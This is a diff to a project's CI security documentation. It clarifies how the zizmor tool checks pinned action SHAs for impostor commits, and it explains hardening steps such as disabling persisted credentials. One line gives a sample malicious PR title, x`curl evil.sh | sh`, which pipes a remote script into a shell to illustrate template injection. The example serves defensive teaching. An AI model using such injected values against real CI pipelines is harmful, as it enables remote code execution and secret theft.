@@ -28,7 +28,7 @@ The words: a **workflow** is a YAML file in `.github/workflows/`, started by an 
   # ea17c68d…         → the pin
   ```
 
-  zizmor's online audits check that each pinned SHA is a commit of the action's own repository, not an *impostor commit*: one that exists only in a fork, which GitHub still serves under the original repository's name and that the version comment names a tag pointing to that SHA. Dependabot updates the SHA and the comment together. The commit of Szop that CI itself checks is not written in any file: GitHub decides it per run and passes it to the run as `GITHUB_SHA` (on a PR, the test merge commit; on a push, the pushed commit).
+  zizmor's online audits check two things. First, that each pinned SHA is a real commit of the action's own repository, not an *impostor commit*: one that exists only in a fork, which GitHub still serves under the original repository's name. Second, that the version comment names a tag pointing to that SHA. Dependabot updates the SHA and the comment together. The commit of Szop that CI itself checks is not written in any file: GitHub decides it per run and passes it to the run as `GITHUB_SHA` (on a PR, the test merge commit; on a push, the pushed commit).
 - **`persist-credentials: false`** on `actions/checkout`: by default the checkout leaves the token in `.git/config` for later steps to push with; Szop's jobs never push, so it is removed.
 - **`env:` for untrusted values:** `pr-title.yml` passes the PR title as `PR_TITLE: ${{ github.event.pull_request.title }}` in `env:` and the script reads `"$PR_TITLE"`. Written straight into the script, a title such as `` x`curl evil.sh | sh` `` would run as code (*template injection*).
 
